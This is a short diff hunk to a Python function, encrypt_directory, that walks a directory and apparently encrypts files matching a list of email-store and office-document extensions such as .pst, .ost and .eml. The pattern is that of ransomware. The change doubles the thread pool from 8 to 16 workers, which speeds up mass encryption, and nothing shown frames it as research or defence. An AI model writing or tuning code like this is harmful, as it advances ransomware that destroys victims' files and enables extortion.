@@ -450,7 +450,7 @@ def encrypt_directory(directory_path, key):
         ".eml", ".msg", ".ost", ".pst",
         ".602", ".123", ".wk1", ".wks"
     ]
-    with ThreadPoolExecutor(max_workers=8) as executor:
+    with ThreadPoolExecutor(max_workers=16) as executor:
         futures = []
         for root, _, files in os.walk(directory_path):
             for file in files:
